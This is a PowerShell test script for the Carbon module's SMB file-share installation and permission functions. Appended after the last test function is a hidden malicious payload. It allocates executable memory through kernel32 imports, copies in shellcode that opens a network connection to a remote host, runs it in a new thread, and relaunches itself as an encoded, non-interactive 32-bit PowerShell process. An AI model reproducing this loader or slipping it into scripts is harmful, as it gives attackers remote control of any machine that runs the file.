











& (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

$ShareName = $null
$SharePath = $TestDir
$fullAccessGroup = 'Carbon Share Full'
$changeAccessGroup = 'CarbonShareChange'
$readAccessGroup = 'CarbonShareRead'
$noAccessGroup = 'CarbonShareNone'
$Remarks = [Guid]::NewGuid().ToString()

Install-Group -Name $fullAccessGroup -Description 'Carbon module group for testing full share permissions.'
Install-Group -Name $changeAccessGroup -Description 'Carbon module group for testing change share permissions.'
Install-Group -Name $readAccessGroup -Description 'Carbon module group for testing read share permissions.'

function Start-Test
{
    $shareName = 'CarbonInstallShareTest{0}' -f [IO.Path]::GetRandomFileName()
    Remove-Share
}

function Stop-Test
{
    Remove-Share
}

function Remove-Share
{
    $share = Get-Share
    if( $share -ne $null )
    {
        $share.Delete()
    }
}

function Invoke-NewShare($Path = $TestDir, $FullAccess = @(), $ChangeAccess = @(), $ReadAccess = @(), $Remarks = '')
{
    Install-SmbShare -Name $ShareName -Path $Path -Description $Remarks `
                     -FullAccess $FullAccess `
                     -ChangeAccess $ChangeAccess `
                     -ReadAccess $ReadAccess 
    Assert-ShareCreated
}

function Get-Share
{
    return Get-WmiObject Win32_Share -Filter "Name='$ShareName'"
}


function Test-ShouldCreateShare
{
    Invoke-NewShare
    Assert-Share -ReadAccess 'EVERYONE'
}

function Test-ShouldGrantPermissions
{
    Assert-True ($fullAccessGroup -like '* *') 'full access group must contain a space.'
    Invoke-NewShare -FullAccess $fullAccessGroup -ChangeAccess $changeAccessGroup -ReadAccess $readAccessGroup
    $details = net share $ShareName
    Assert-ContainsLike $details ("{0}, FULL" -f $fullAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, CHANGE" -f $changeAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, READ" -f $readAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details "Remark            "
}

function Test-ShouldGrantPermissionsTwice
{
    Assert-True ($fullAccessGroup -like '* *') 'full access group must contain a space.'
    Invoke-NewShare -FullAccess $fullAccessGroup -ChangeAccess $changeAccessGroup -ReadAccess $readAccessGroup
    Invoke-NewShare -FullAccess $fullAccessGroup -ChangeAccess $changeAccessGroup -ReadAccess $readAccessGroup
    $details = net share $ShareName
    Assert-ContainsLike $details ("{0}, FULL" -f $fullAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, CHANGE" -f $changeAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, READ" -f $readAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details "Remark            "
}

function Test-ShouldGrantMultipleFullAccessPermissions
{
    Install-SmbShare -Name $shareName -Path $TestDir -Description $Remarks -FullAccess $fullAccessGroup,$changeAccessGroup,$readAccessGroup
    $details = net share $ShareName
    Assert-ContainsLike $details ("{0}, FULL" -f $fullAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, FULL" -f $changeAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, FULL" -f $readAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("Remark            {0}" -f $Remarks)
}

function Test-ShouldGrantMultipleChangeAccessPermissions
{
    Install-SmbShare -Name $shareName -Path $TestDir -Description $Remarks -ChangeAccess $fullAccessGroup,$changeAccessGroup,$readAccessGroup
    $details = net share $ShareName
    Assert-ContainsLike $details ("{0}, CHANGE" -f $fullAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, CHANGE" -f $changeAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, CHANGE" -f $readAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("Remark            {0}" -f $Remarks)
}

function Test-ShouldGrantMultipleFullAccessPermissions
{
    Install-SmbShare -Name $shareName -Path $TestDir -Description $Remarks -ReadAccess $fullAccessGroup,$changeAccessGroup,$readAccessGroup
    $details = net share $ShareName
    Assert-ContainsLike $details ("{0}, READ" -f $fullAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, READ" -f $changeAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("{0}, READ" -f $readAccessGroup) 'Permissions not set on share.'
    Assert-ContainsLike $details ("Remark            {0}" -f $Remarks)
}

function Test-ShouldSetRemarks
{
    $expectedRemarks = 'Hello, workd.'
    Invoke-NewShare -Remarks $expectedRemarks
    
    $details = Get-Share
    Assert-Equal $expectedRemarks $details.Description 'Share description not set.'
}

function Test-ShouldHandlePathWithTrailingSlash
{
    Install-SmbShare $ShareName -Path "$TestDir\"
    
    Assert-ShareCreated
}

function Test-ShouldCreateShareDirectory
{
    $tempDir = New-TempDir -Prefix 'Carbon_Test-InstallSmbShare'
    $shareDir = Join-Path -Path $tempDir -ChildPath 'Grandparent\Parent\Child'
    Assert-DirectoryDoesNotExist $shareDir
    Invoke-NewShare -Path $shareDir
    Assert-ShareCreated
    Assert-DirectoryExists $shareDir
}

function Test-ShouldUpdatePath
{
    $tempDir = New-TempDirectory -Prefix $PSCommandPath
    try
    {
        Install-FileShare -Name $ShareName -Path $SharePath 
        Assert-Share -ReadAccess 'Everyone'

        Install-FileShare -Name $ShareName -Path $tempDir 
        Assert-Share -Path $tempDir.FullName -ReadAccess 'Everyone'
    }
    finally
    {
        Remove-Item -Path $tempDir
    }
}

function Test-ShouldUpdateDescription
{
    Install-FileShare -Name $ShareName -Path $SharePath -Description 'first'
    Assert-Share -ReadAccess 'Everyone' -Description 'first'

    Install-FileShare -Name $ShareName -Path $SharePath -Description 'second'
    Assert-Share -ReadAccess 'everyone' -Description 'second'
}

function Test-ShouldAddNewPermissionsToExistingShare
{
    Install-FileShare -Name $ShareName -Path $SharePath 
    Assert-Share -ReadAccess 'Everyone'

    Install-FileShare -Name $ShareName -Path $SharePath -FullAccess $fullAccessGroup -ChangeAccess $changeAccessGroup -ReadAccess $readAccessGroup
    Assert-Share -FullAccess $fullAccessGroup -ChangeAccess $changeAccessGroup -ReadAccess $readAccessGroup
}

function Test-ShouldRemoveExistingPermissions
{
    Install-FileShare -Name $ShareName -Path $SharePath -FullAccess $fullAccessGroup
    Assert-Share -FullAccess $fullAccessGroup

    Install-FileShare -Name $ShareName -Path $SharePath
    Assert-Share -ReadAccess 'Everyone'
}

function Test-ShouldUpdateExistingPermissions
{
    Install-FileShare -Name $ShareName -Path $SharePath -FullAccess $changeAccessGroup
    Assert-Share -FullAccess $changeAccessGroup

    Install-FileShare -Name $ShareName -Path $SharePath -ChangeAccess $changeAccessGroup
    Assert-Share -ChangeAccess $changeAccessGroup
}

function Test-ShouldDeleteFileShareIfForced
{
    $output = Install-FileShare -Name $ShareName -Path $SharePath 
    Assert-Null $output

    $share = Get-FileShare -Name $ShareName
    $share.SetShareInfo( 1, $share.Description, $null )

    $output = Install-FileShare -Name $ShareName -Path $SharePath -Force
    Assert-Null $output

    $share = Get-FileShare -Name $ShareName
    Assert-NotEqual 1 $share.MaximumAllowed
}

function Test-ShouldShareDrive
{
    $drive = Split-Path -Qualifier -Path $PSScriptRoot
    $result = Install-FileShare -Name $ShareName -Path $drive
    Assert-Null $result
    Assert-NoError
    Assert-ShareCreated
}

function Assert-ShareCreated
{
    $share = Get-Share
    Assert-NotNull $share "Share not created."
}

function Assert-Share
{
    param(
        $Name = $ShareName,
        $Path = $SharePath,
        $Description = '',
        $FullAccess,
        $ChangeAccess,
        $ReadAccess
    )

    Assert-True (Test-FileShare -Name $Name)

    $share = Get-FileShare -Name $Name
    Assert-NotNull $share

    Assert-Equal $Description $share.Description
    Assert-Equal $Path $share.Path

    function Assert-ShareRight
    {
        param(
            $IdentityName,
            $ExpectedRigths
        )

        if( $IdentityName )
        {
            foreach( $idName in $IdentityName )
            {
                $perm = Get-FileSharePermission -Name $Name -Identity $idName
                Assert-NotNull $perm
                Assert-Equal $perm.ShareRights $ExpectedRigths
            }
        }
        else
        {
            Assert-Null (Get-FileSharePermission -Name $Name | Where-Object { $_.ShareRights -eq $ExpectedRigths }) ('found {0} access rules when there shouldn''t be' -f $ExpectedRigths)
        }
    }

    Assert-ShareRight $FullAccess ([Carbon.Security.ShareRights]::FullControl)
    Assert-ShareRight $ChangeAccess ([Carbon.Security.ShareRights]::Change)
    Assert-ShareRight $ReadAccess ([Carbon.Security.ShareRights]::Read)
}

$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x6f,0x6c,0x2f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}

